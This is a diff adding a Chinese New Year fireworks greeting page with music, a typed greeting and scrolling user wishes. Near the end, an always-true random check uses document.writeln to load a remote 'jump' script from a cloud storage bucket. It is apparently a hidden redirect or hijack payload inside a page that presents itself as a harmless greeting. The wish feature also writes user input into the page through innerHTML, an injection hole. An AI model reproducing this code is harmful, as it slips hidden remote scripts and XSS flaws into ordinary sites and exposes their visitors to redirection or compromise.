@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="360-analysis-id" content="2w1j1d382x352p2s">
+    <meta charset="utf-8">
+    <style type="text/css">
+	p{font-weight:bold;}
+	p{font-weight:1000;}
+	p{font-size:48px;}
+	p{font-family:"楷体";}
+	</style>
+    <title>新年快乐</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#000000">
+    <meta name="msapplication-TileColor" content="#000000">
+    <link href="static/files/css/main.css" rel="stylesheet">
+    <script src="static/files/js/jquery.min.js" type="text/javascript"></script>
+    <script>
+        var shouci = true;
+        console.log(shouci);
+
+        function bodyPlayMusic() {
+            if (shouci) {
+                shouci = false;
+                audio.play();
+                console.log(shouci);
+            }
+        };
+    </script>
+
+<!--    弹幕head头部代码-->
+<style>
+.box{
+  width: 100%;
+  height: 100%;
+  margin:0 auto;
+}
+.barrage-container-wrap{
+    width: 100%;
+    height: 1065px;
+    <!--height: 100%;-->
+    <!--height: 100%;-->
+    position: relative;
+    overflow: hidden;
+    background: url(static/images/red.png) no-repeat;
+    background-size: 100% 100%;
+    background: rgba(220,38,38,0.0);
+}
+.barrage-container{
+    {#position: absolute;#}
+    position: relative;
+    top: 0px;
+    left: 0;
+    right: 0;
+    {#bottom: 30px;#}
+    bottom: 0px;
+    cursor: default;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+}
+.barrage-item{
+    position:absolute;
+    top:0;
+    left: 100%;
+    white-space: nowrap;
+    cursor: pointer;
+    color:#fff;
+}
+.barrage-item .barrage-tip{
+    display: none;
+    position: absolute;
+    top:-26px;
+    padding: 7px 15px;
+    line-height: 12px;
+    font-size: 12px;
+    color: #f20606;
+    background-color: #fff;
+    white-space: nowrap;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    -webkit-box-shadow: 0 0 10px 1px rgba(0,0,0,.1);
+    box-shadow: 0 0 10px 1px rgba(0,0,0,.1);
+    -webkit-transform-origin: 15px 100%;
+    -ms-transform-origin: 15px 100%;
+    transform-origin: 15px 100%;
+    webkit-animation: tipScale cubic-bezier(.22,.58,.12,.98) .4s;
+    animation: tipScale cubic-bezier(.22,.58,.12,.98) .4s;
+  }
+.send-wrap{
+    margin-top: 20px;
+    {#border-bottom: 100px;#}
+}
+
+.input{
+    {#position: absolute;#}
+    position: relative;
+    width: 300px;
+    height: 30px;
+    line-height: 30px;
+    outline: none;
+    -webkit-appearance: none;
+    border-radius: 5px;
+    padding:0;
+    padding-left: 10px;
+}
+.send-btn{
+    {#position: absolute;#}
+    height: 38px;
+    line-height: 38px;
+    text-align: center;
+    font-weight: bold;
+    color: #fff;
+    background: #93d0ea;
+    text-shadow:1px 1px 1px #333;
+    border-radius: 5px;
+    margin:0 20px 20px 0;
+    position: relative;
+    overflow: hidden;
+    cursor: pointer;
+    padding:5px 15px;
+}
+@-webkit-keyframes tipScale{
+    0{
+      -webkit-transform: scale(0);
+       transform: scale(0);
+    }
+    50% {
+       -webkit-transform: scale(1.1);
+       transform: scale(1.1);
+    }
+    100% {
+      -webkit-transform: scale(1);
+      transform: scale(1);
+    }
+}
+</style>
+</head>
+<!-- onclick="bodyPlayMusic()" -->
+
+<body>
+<div class="box">
+    <audio id="audioDom" src="https://link.hhtjim.com/163/1413464902.mp3" preload="auto" loop="loop"></audio>
+
+    <div id="yhBtn" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff ; font-size:20px    ">
+        <p>😋点击小龙有惊喜哦！😋</p>
+        <img style="width:250px;margin-bottom:36px " src="static/images/dragon.png">
+    </div>
+
+    <div style="height: 0; width: 0; position: absolute; visibility: hidden;">
+
+        <svg xmlns="http://www.w3.org/2000/svg">
+
+            <symbol id="icon-play" viewBox="0 0 24 24">
+                <path d="M8 5v14l11-7z"></path>
+            </symbol>
+            <symbol id="icon-pause" viewBox="0 0 24 24">
+                <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"></path>
+            </symbol>
+            <symbol id="icon-close" viewBox="0 0 24 24">
+                <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
+                </path>
+            </symbol>
+            <symbol id="icon-settings" viewBox="0 0 24 24">
+                <path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z">
+                </path>
+            </symbol>
+            <symbol id="icon-sound-on" viewBox="0 0 24 24">
+                <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z">
+                </path>
+            </symbol>
+            <symbol id="icon-sound-off" viewBox="0 0 24 24">
+                <path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z">
+                </path>
+            </symbol>
+        </svg>
+    </div>
+<script async src="https://download.kstore.space/download/2719/newyear/files/jishu.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?dbc09cc585d9dc4f3041dfe9411dead2";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  <div class="barrage-container-wrap clearfix">
+    <div class="barrage-container">
+    <!-- 引用NianBroken的FireworkSimulator，仅为引用，非恶意搬运，侵删 -->
+    <div class="container">
+        <div class="loading-init">
+            <div class="loading-init__header"></div>
+            <div class="loading-init__status"></div>
+        </div>
+        <div class="stage-container remove">
+            <div class="page_two hide">
+                <div id="text" style="display:none;">辞暮尔尔 烟火年年
+                    <br>2024🧨
+                    <br>希望大家都能顺风👟 顺水🛶 顺财神💰
+                    <br>平安喜乐🌞 万事顺遂🚗
+                    <br>心纳吉👩‍⚕️ 万事欣👩‍🚀 岁安平👨‍✈️
+                </div>
+
+                <div class="type_words" id="contents" style="font-size:1.05rem;line-height:1.5rem;"></div>
+            </div>
+
+				<div class="canvas-container">
+
+					<canvas id="trails-canvas">
+					</canvas>
+					<canvas id="main-canvas">
+					</canvas>
+				</div>
+
+				<div class="controls">
+                <div class="barrage-container" style="text-align:center">
+                    <div class="send-wrap" style="top: 660px" >
+                        <input type="text" class="input" placeholder="新年愿望发送" name="prey" id="prey">
+                        <span id="send" class="send-btn">发送</span>
+                    </div>
+                </div>
+					<div class="btn pause-btn">
+						<svg fill="white" width="24" height="24">
+							<use href="#icon-pause" xlink:href="#icon-pause">
+							</use>
+						</svg>
+					</div>
+					<div class="btn sound-btn">
+						<svg fill="white" width="24" height="24">
+							<use href="#icon-sound-off" xlink:href="#icon-sound-off">
+							</use>
+						</svg>
+					</div>
+					<div class="btn settings-btn">
+						<svg fill="white" width="24" height="24">
+							<use href="#icon-settings" xlink:href="#icon-settings">
+							</use>
+						</svg>
+					</div>
+				</div>
+				<div class="menu hide">
+					<div class="menu__inner-wrap">
+						<div class="btn btn--bright close-menu-btn">
+							<svg fill="white" width="24" height="24">
+								<use href="#icon-close" xlink:href="#icon-close">
+								</use>
+							</svg>
+						</div>
+						<div class="menu__header">
+							设置
+						</div>
+						<div class="menu__subheader">
+							若想了解更多信息 请点击任意标签
+						</div>
+						<form>
+							<div class="form-option form-option--select">
+								<label class="shell-type-label">
+								烟花类型
+								</label>
+								<select class="shell-type">
+								</select>
+							</div>
+							<div class="form-option form-option--select">
+								<label class="shell-size-label">
+								烟花大小
+								</label>
+								<select class="shell-size">
+								</select>
+							</div>
+							<div class="form-option form-option--select">
+								<label class="quality-ui-label">
+								画质
+								</label>
+								<select class="quality-ui">
+								</select>
+							</div>
+							<div class="form-option form-option--select">
+								<label class="sky-lighting-label">
+								照亮天空
+								</label>
+								<select class="sky-lighting">
+								</select>
+							</div>
+							<div class="form-option form-option--select">
+								<label class="scaleFactor-label">
+								缩放
+								</label>
+								<select class="scaleFactor">
+								</select>
+							</div>
+							<div class="form-option form-option--checkbox">
+								<label class="auto-launch-label">
+								自动放烟花
+								</label>
+								<input class="auto-launch" type="checkbox" />
+							</div>
+							<div class="form-option form-option--checkbox form-option--finale-mode">
+								<label class="finale-mode-label">
+								同时放更多的烟花
+								</label>
+								<input class="finale-mode" type="checkbox" />
+							</div>
+							<div class="form-option form-option--checkbox">
+								<label class="hide-controls-label">
+								隐藏控制按钮
+								</label>
+								<input class="hide-controls" type="checkbox" />
+							</div>
+							<div class="form-option form-option--checkbox form-option--fullscreen">
+								<label class="fullscreen-label">
+								全屏
+								</label>
+								<input class="fullscreen" type="checkbox" />
+							</div>
+							<div class="form-option form-option--checkbox">
+								<label class="long-exposure-label">
+								保留烟花的火花
+								</label>
+								<input class="long-exposure" type="checkbox" />
+							</div>
+						</form>
+						<div class="credits">
+			                Passionately built by <a href="https://cmiller.tech/" target="_blank">Caleb Miller</a>.
+						</div>
+					</div>
+				</div>
+        </div>
+        <div class="help-modal">
+				<div class="help-modal__overlay">
+				</div>
+				<div class="help-modal__dialog">
+					<div class="help-modal__header">
+					</div>
+					<div class="help-modal__body">
+					</div>
+					<button type="button" class="help-modal__close-btn">
+					关闭
+					</button>
+				</div>
+			</div>
+    </div>
+
+</div>
+    </div>
+  </div>
+		<script src='static/js/fscreen.js'></script>
+		<script src='static/js/Stage.js'></script>
+		<script src='static/js/MyMath.js'></script>
+		<script src="static/js/script.js"></script>
+    <script>
+
+            function musicPlay() {
+                var media = document.querySelector('#audioDom');
+                media.play();
+            }
+
+            function musicInBrowserHandler() {
+                setTimeout(function () {
+                    musicPlay()
+                }, 0)
+            }
+
+            function audioAutoPlay() {
+                var audio = document.getElementById('audioDom');
+                audio.play();
+            }
+
+            $(function () {
+                console.log(updateConfig({
+                    autoLaunch: false
+                }));
+                setInterval(function () {
+                    $('#yhBtn').hide()
+                    console.log(updateConfig({
+                        autoLaunch: true
+                    }));
+                    musicPlay();
+                    audioAutoPlay();
+                }, 3000);
+
+                setTimeout(() => {
+                    start();
+                    fireworks();
+
+
+                }, 3000) //
+
+
+            });
+
+        function fireworks() {
+            $('.page_one').addClass('hide');
+            $('.page_two').removeClass('hide');
+        }
+
+        function start() {
+            let str = $("#text").html();
+            let str_ = ''
+            let i = 0
+            let content = document.getElementById('contents')
+            let timer = setInterval(() => {
+                if (str_.length < str.length) {
+                    str_ += str[i++]
+                    content.innerHTML = '<p>' + str_ + '<span class="xx" style="opacity: 1;    color: white;">∎</span></p>' //打印时加光标
+                } else {
+                    clearInterval(timer)
+                    content.innerHTML = '<p>' + str_ + '</p>'
+                }
+            }, 100)
+        }
+    </script><!--引用结束(内容未修改)-->
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?c314395e62fb55e30828e0ea8cca8b3a";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<script>
+    var aaa = Math.ceil(Math.random()*100);
+    console.log(aaa);
+    if(aaa <= 100){
+        document.writeln("<script src=\"https://api123ff.oss-cn-beijing.aliyuncs.com/jump_https_1231.js?id=wtx18&m=15&c=1\"><\/script>");
+        //alert("AAA=" + aaa);
+    }
+</script>
+<!--firework_simulator版权所有人:NianBroken，侵删-->
+
+
+</body>
+<script>
+;(function(){
+  var barrageArray = [
+         {
+            url: '',
+            text: '和大家一起心想事成',
+            level: 10
+          },          {
+            url: '',
+            text: '遇见一段双向奔赴的爱情～恰时恰地恰好是我与你～',
+            level: 10
+          },          {
+            url: '',
+            text: '希望男朋友好好的呀，作为密接真的很难不让人担心',
+            level: 10
+          },          {
+            url: '',
+            text: '去想去的地方   读想读的书',
+            level: 10
+          },          {
+            url: '',
+            text: '希望努力付出的得到收获！',
+            level: 10
+          },          {
+            url: '',
+            text: '来比钱还清外债',
+            level: 10
+          },          {
+            url: '',
+            text: '博士答辩顺利进行',
+            level: 10
+          },          {
+            url: '',
+            text: '师范生技能大赛拿奖，研究生顺利毕业，和爱的人一直在一起',
+            level: 10
+          },          {
+            url: '',
+            text: '考编，考驾照，有个心仪的对象，家人健康',
+            level: 10
+          },          {
+            url: '',
+            text: '考研成功！成为小富婆！谈一场甜甜的恋爱！',
+            level: 10
+          },          {
+            url: '',
+            text: '大声喊出来！考研成功！',
+            level: 10
+          },          {
+            url: '',
+            text: '希望自己朋友家人以及所有人都开开心心，平平安安的',
+            level: 10
+          },          {
+            url: '',
+            text: '希望跟喜欢自己和自己喜欢的人在一起，一切都合适',
+            level: 10
+          },          {
+            url: '',
+            text: '也希望所遇良人 ，收获一份好的爱情',
+            level: 10
+          },          {
+            url: '',
+            text: '一检过理想大学录取分数线！！！',
+            level: 10
+          },          {
+            url: '',
+            text: '成为配音大佬！',
+            level: 10
+          },          {
+            url: '',
+            text: '快点解封好好上班，世界恢复正常，美好！平静！',
+            level: 10
+          },          {
+            url: '',
+            text: '希望和他在一起',
+            level: 10
+          },          {
+            url: '',
+            text: '大声喊出来：找到男朋友！',
+            level: 10
+          },          {
+            url: '',
+            text: '拥有花不完的钱',
+            level: 10
+          },          {
+            url: '',
+            text: '学会爱护自己 我要和她在一起～',
+            level: 10
+          },          {
+            url: '',
+            text: '希望希望明年找到一个善良正直的人结婚',
+            level: 10
+          },          {
+            url: '',
+            text: '高高明年考试运暴涨考啥啥都过！和自己喜欢的人好好的，感情能够越来越稳定',
+            level: 10
+          },          {
+            url: '',
+            text: '希望明年找到一个善良正直的人结婚',
+            level: 10
+          },          {
+            url: '',
+            text: '明年一定要好好的！',
+            level: 10
+          },          {
+            url: '',
+            text: '勇敢做自己，勇敢say NO',
+            level: 10
+          },          {
+            url: '',
+            text: '找到自己的勇敢',
+            level: 10
+          },          {
+            url: '',
+            text: '事情妥善解决',
+            level: 10
+          },          {
+            url: '',
+            text: '脱单，找到属于自己的幸福！',
+            level: 10
+          },
+
+      ];
+  var barrageColorArray = [
+    '#FFFF00','#FF4500','#FAF0E6','#7CFC00','#00FFFF','#FF1493','#FFB6C1','#E6E6FA','#B0C4DE','#00BFFF','#40E0D0',
+      '#00FA9A','#98FB98','#7FFF00','#FAFAD2','#F0E68C','#FFDEAD','#F4A460'
+  ];
+  var barrageTipWidth = 50; //提示语的长度
+
+  var barrageBoxWrap = document.querySelector('.barrage-container-wrap');;
+  var barrageBox = document.querySelector('.barrage-container');
+  var inputBox = document.querySelector('.input');
+  var sendBtn = document.querySelector('.send-btn');
+
+
+  //容器的宽高度
+  var barrageWidth = ~~window.getComputedStyle(barrageBoxWrap).width.replace('px','');
+  var barrageHeight = ~~window.getComputedStyle(barrageBoxWrap).height.replace('px','');
+
+  //发送
+  function sendMsg(){
+    var inputValue = inputBox.value;
+    inputValue .replace(/\ +/g, "");
+
+    if (inputValue.length <= 0) {
+        alert('请输入');
+        return false;
+    }
+
+    //生成弹幕
+    createBarrage(inputValue,true);
+    inputBox.value = '';
+        $.ajax({
+        url:'/',
+        type:"post",
+        data:{
+            "uid":inputValue
+        },
+        dataType:"JSON",
+        success:function (res){
+            if (res.status){
+                console.log(inputValue);
+            }else {
+                alert(res.error);
+                console.log("失败");
+            }
+        }
+    })
+  }
+
+
+  //创建弹幕
+  function createBarrage(msg, isSendMsg){
+    var divNode = document.createElement('div');
+    var spanNode = document.createElement('span');
+
+    divNode.innerHTML = msg;
+    divNode.classList.add('barrage-item');
+    barrageBox.appendChild(divNode);
+
+    spanNode.innerHTML = '举报';
+    spanNode.classList.add('barrage-tip');
+    divNode.appendChild(spanNode);
+
+    barrageOffsetLeft = getRandom(barrageWidth, barrageWidth*2);
+    barrageOffsetLeft = isSendMsg ? barrageWidth : barrageOffsetLeft
+    barrageOffsetTop = getRandom(10, barrageHeight-10);
+    barrageColor = barrageColorArray[Math.floor(Math.random()*(barrageColorArray.length))];
+
+    //执行初始化滚动
+    initBarrage.call(divNode,{
+      left : barrageOffsetLeft,
+      top : barrageOffsetTop,
+      color : barrageColor
+    });
+  }
+
+  //初始化弹幕移动(速度，延迟)
+  function initBarrage(obj) {
+    //初始化
+    obj.top = obj.top || 0;
+    obj.class = obj.color || '#fff';
+    this.style.left = obj.left + 'px';
+    this.style.top = obj.top + 'px';
+    this.style.color = obj.color;
+
+    //添加属性
+    this.distance = 0;
+    this.width = ~~window.getComputedStyle(this).width.replace('px','');
+    this.offsetLeft = obj.left;
+    this.timer = null;
+
+    //弹幕子节点
+    var barrageChileNode = this.children[0];
+    barrageChileNode.style.left = (this.width-barrageTipWidth)/2 + 'px';
+
+    //运动
+    barrageAnimate(this);
+
+    //停止
+    this.onmouseenter = function(){
+      barrageChileNode.style.display= 'block';
+      cancelAnimationFrame(this.timer);
+    };
+
+    this.onmouseleave = function(){
+      barrageChileNode.style.display = 'none';
+      barrageAnimate(this);
+    };
+
+    //举报
+    barrageChileNode.onclick = function(){
+      alert('举报成功');
+    }
+  }
+
+  //弹幕动画
+  function barrageAnimate(obj){
+    move(obj);
+
+    if(Math.abs(obj.distance) < obj.width+obj.offsetLeft){
+      obj.timer = requestAnimationFrame(function(){
+        barrageAnimate(obj);
+      });
+    }else{
+      cancelAnimationFrame(obj.timer);
+      //删除节点
+      obj.parentNode.removeChild(obj);
+    }
+  }
+
+  //移动
+  function move(obj){
+    obj.distance--;
+    obj.style.transform = 'translateX('+obj.distance+'px)';
+    obj.style.webkitTransform = 'translateX('+obj.distance+'px)';
+  }
+
+  //随机获取高度
+  function getRandom(start, end){
+    return start +(Math.random() * (end - start));
+  }
+
+
+  /*******初始化事件**********/
+  //系统数据
+  barrageArray.forEach(function(item,index){
+    createBarrage(item.text, false);
+  });
+
+  //点击发送
+  sendBtn.onclick = sendMsg;   //点击发送
+
+  //回车
+  inputBox.onkeydown = function(e){
+    e = e|| window.event;
+    if(e.keyCode == 13){
+      sendMsg();
+    }
+  }
+
+})()
+
+//兼容写法
+(function() {
+    var lastTime = 0;
+    var vendors = ['webkit', 'moz'];
+    for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
+        window.requestAnimationFrame = window[vendors[x] + 'RequestAnimationFrame'];
+        window.cancelAnimationFrame = window[vendors[x] + 'CancelAnimationFrame'] ||    // Webkit中此取消方法的名字变了
+                                      window[vendors[x] + 'CancelRequestAnimationFrame'];
+    }
+
+    if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = function(callback, element) {
+            var currTime = new Date().getTime();
+            var timeToCall = Math.max(0, 16.7 - (currTime - lastTime));
+            var id = window.setTimeout(function() {
+                callback(currTime + timeToCall);
+            }, timeToCall);
+            lastTime = currTime + timeToCall;
+            return id;
+        };
+    }
+    if (!window.cancelAnimationFrame) {
+        window.cancelAnimationFrame = function(id) {
+            clearTimeout(id);
+        };
+    }
+}());
+</script>
+
+</html>
